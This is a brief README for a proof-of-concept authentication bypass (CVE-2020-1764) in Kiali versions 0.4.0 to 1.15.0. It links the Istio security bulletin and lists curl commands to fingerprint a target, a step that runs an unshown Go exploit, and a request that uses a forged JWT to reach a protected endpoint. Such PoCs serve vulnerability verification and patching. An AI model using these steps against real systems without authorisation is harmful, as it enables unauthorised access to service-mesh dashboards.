# CVE-2020-1764 PoC

Auth bypass PoC for Kiali 0.4.0 to 1.15.0 using login auth strategy ([Security Bulletin](https://istio.io/latest/news/security/istio-security-2020-004/))

check version: `curl 'http://<IP>/api`

check auth strategy: `curl 'http://<IP>/api/auth/info'`

`go run ./poc.go`

`curl 'http://<IP>/api/status' -H "Authorization: Bearer $JWT"`
